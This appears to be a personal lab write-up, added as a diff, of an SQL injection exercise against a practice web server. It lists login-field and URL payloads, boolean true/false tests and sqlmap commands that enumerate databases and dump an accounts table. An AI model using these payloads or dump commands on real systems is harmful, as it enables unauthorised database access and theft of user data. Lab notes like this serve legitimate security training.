@@ -1,0 +1,49 @@
+]SQL Injection - Lab
+
+Target IP - 10.124.211.96
+
+Goals - Explore the webserver - We have a Home, News, Awards, and Sign Up page
+
+No robots.txt file on this webserver
+
+Goal 2 - Test and exploit the injection points
+
+Hit 1 - Login System - Username field
+Username-admin'
+password-admin
+
+
+Hit 2 -Login System - Username field
+
+Username-'|| 1+1=#
+
+We get - Image S3
+
+Hit-3 ' in ?cmd=
+Payload /news.php?cmd='
+and get - Image S4
+
+Hit 4 - Visit /newsdetails.php
+Payload - ?cmd='  and we get Image S5
+
+There is scope for exploitation here,
+Payload ?id=1 and 1=1; -- -  (Condition - 1=1 ->True) -We get Image S6
+
+Now, let's tweak the condition to 1=2 -False
+We get - Image S6 (1) - No news displayed
+
+-----------------------------------------------------------------
+Dumping data from the database, using Burp Proxy - Right approach
+
+sqlmap -r File --dbs --batch We get Image S7
+sqlmap -r File -D aqd --tables --batch -We get Image S7(1)
+sqlmap -r File -D awd -T accounts --dump-all 
+
+Using sqlmap,finding the vulnerable point and dumping-Right approach
+
+We know id is a vulnerable point
+sqlmap -u http://10.124.211.96?id=1 --dbs --batch - We get Image S7
+
+sqlmap -u http://10.124.211.96?id=1 --D awd --tables - We get Image S7(1)
+
+sqlmap -u http://10.124.211.96?id=1 -D awd -T aI1 --dump - We get Image S7 (2)
